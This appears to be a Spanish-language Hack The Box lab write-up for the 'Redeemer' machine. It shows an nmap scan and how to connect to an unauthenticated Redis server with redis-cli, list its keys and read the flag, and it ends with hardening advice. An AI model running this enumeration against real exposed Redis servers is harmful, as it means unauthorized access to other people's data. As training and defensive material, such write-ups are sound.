# 💀 HTB - Redeemer

---

## 🧠 Información

- **IP:** 10.129.89.228  
- **Dificultad:** Muy fácil  
- **Categoría:** Starting Point  
- **Distro usada:** Kali Linux  
- **Fecha:** 6 Apr 2026  
- **Tiempo:** 53 minutos wifi inestable
- **Autor:** [miguelt86](https://www.hackthebox.com/profile/2126021)

---

## 🎯 Objetivo

Acceder a un servicio Redis expuesto sin autenticación y capturar la bandera.

---

## 🔎 Enumeración

### 🔍 Escaneo Nmap

```bash
nmap -p- -sV -T4 10.129.89.228  
```

### 📡 Servicios detectados

```text
6379/tcp open redis redis key value store 5.0.7
```

---

## 🔐 Explotación

- Conexión al servicio Redis sin autenticación:

```bash
redis-cli -h 10.129.89.228  
``` 

---

## 🧠 Post-Explotación

- Exploración básica del servicio:

```bash
info
```

- Enumeración de bases de datos y estructura interna

```bas
select 0
```

## Listado de claves:

```bash
keys *
```

### Lectura de valor:

```bash
get flag
```
---

## 🏁 Flag

```text
✔️ Bandera capturada correctamente.
```

---

## 🧰 Herramientas utilizadas

* nmap
* redis-cli
* openvpn

---

## 🏆 Resultado

* Machine Rank: #<completar>
* Fecha: 07 Apr 2026
* Estado: Retired
* ✅ Bandera capturada

---

## 🛡️ Defensa (HTB Inverso)

* Configurar autenticación en Redis (equirepass o ACL)
* Limitar acceso a localhost
* Restringir puerto 6379 en firewall

---

## 🧾 Observaciones

* Servicio crítico expuesto sin autenticación
* Caso típico de mala configuración
* Fácil de detectar con escaneo básico

---

## ✍️ Autor

GitHub: @Migueltejada86
HTB Profile: miguelt86 🐍💻


